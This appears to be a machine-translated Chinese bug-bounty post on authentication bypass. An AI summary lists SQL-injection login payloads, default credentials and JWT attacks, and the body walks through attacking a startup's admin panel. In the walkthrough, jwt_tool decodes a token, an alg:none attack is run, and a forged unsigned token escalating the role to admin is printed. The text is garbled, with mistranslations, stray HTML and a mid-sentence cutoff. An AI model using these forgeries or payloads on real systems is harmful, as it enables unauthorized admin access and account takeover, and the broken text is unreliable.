> [!example] AI 摘要
> 本文系统讲解了多种身份验证绕过技术及其在漏洞赏金中的高价值，重点包括：SQL注入绕过登录（如`admin '--`等经典与高级Payload）、默认凭据利用（常见账号密码及自动化爆破方法）、JWT令牌三大攻击手法（算法置空、HS256/RS256混淆、弱密钥暴力破解），并强调身份验证（“你是谁”）与授权（“你能做什么”）的本质区别。文章指出，此类漏洞可直接获取管理员权限、接管任意账户甚至绕过双因素认证，常对应1000–20000美元以上的高额赏金。

<h2>
 <span>
  我的谈话……
 </span>
</h2>
<p>
 <span>
  我在一个初创公司的管理面板上分析了JWT令牌：
 </span>
</p>
<pre><ol class="list-paddingleft-1" style="margin: 0px; padding: 10px 0px 10px 30px; color: transparent;"><li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px 0px 0px 1em; background-color: rgb(45, 45, 45);"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; display: block; line-height: 22px;"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; display: block;"><code><span><span>python3 jwt_tool</span></span><span><span>.</span></span><span><span>py eyJhbGci</span></span><span><span>...</span></span><span><span>TOKEN</span></span><span><span>...</span></span></code></span></span></li></ol></pre>
<p>
 <span>
  输出：
 </span>
</p>
<pre><ol class="list-paddingleft-1" style="margin: 0px; padding: 10px 0px 10px 30px; color: transparent;"><li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px 0px 0px 1em; background-color: rgb(45, 45, 45);"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; display: block; line-height: 22px;"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; display: block;"><code><span><span>[+]</span></span><span><span>解码后的标记：</span></span></code></span></span></li><li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px 0px 0px 1em; background: rgb(45, 45, 45);"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; display: block; line-height: 22px;"></span></li><li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px 0px 0px 1em; background-color: rgb(45, 45, 45);"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; display: block; line-height: 22px;"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; display: block;"><code><span><span>头部：{</span></span><span><span>"alg"</span></span><span><span>:</span></span><span><span>"HS256"</span></span><span><span>,</span></span><span><span>"typ"</span></span><span><span>:</span></span><span><span>"JWT"</span></span><span><span>}</span></span></code></span></span></li><li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px 0px 0px 1em; background: rgb(45, 45, 45);"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; display: block; line-height: 22px;"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; display: block;"><code><span><span>有效载荷：{</span></span><span><span>"user_id"</span></span><span><span>:</span></span><span><span>1337</span></span><span><span>,</span></span><span><span>"role"</span></span><span><span>:</span></span><span><span>"用户"</span></span><span><span>,</span></span><span><span>"exp"</span></span><span><span>:</span></span><span><span>9999999999</span></span><span><span>}</span></span></code></span></span></li></ol></pre>
<p>
 <span>
  缅因州尝试了
 </span>
 <code>
  <span>
   <span>
    alg
   </span>
  </span>
  <span>
   <span>
    :
   </span>
  </span>
  <span>
   <span>
    none
   </span>
  </span>
 </code>
 <span>
  攻击：
 </span>
</p>
<pre><ol class="list-paddingleft-1" style="margin: 0px; padding: 10px 0px 10px 30px; color: transparent;"><li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px 0px 0px 1em; background-color: rgb(45, 45, 45);"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; display: block; line-height: 22px;"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; display: block;"><code><span><span>python3 jwt_tool</span></span><span><span>.</span></span><span><span>py </span></span><span><span>令牌</span></span><span><span>-</span></span><span><span>X a</span></span></code></span></span></li></ol></pre>

</p>
<pre><ol class="list-paddingleft-1" style="margin: 0px; padding: 10px 0px 10px 30px; color: transparent;"><li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px 0px 0px 1em; background-color: rgb(45, 45, 45);"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; display: block; line-height: 22px;"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; display: block;"><code><span><span>eyJhbGciOiJub25lIn0</span></span><span><span>.</span></span><span><span>eyJ1c2VyX2lkIjoxMzM3LCJyb2xlIjoiYWRtaW4ifQ</span></span><span><span>.</span></span></code></span></span></li></ol></pre>
<p>
 <span>
  将
 </span>
 <code>
  <span>
   <span>

   </span>
  </span>
  <span>
   <span>

   </span>
  </span>
  <span>
   <span>

   </span>
  </span>

  </span>
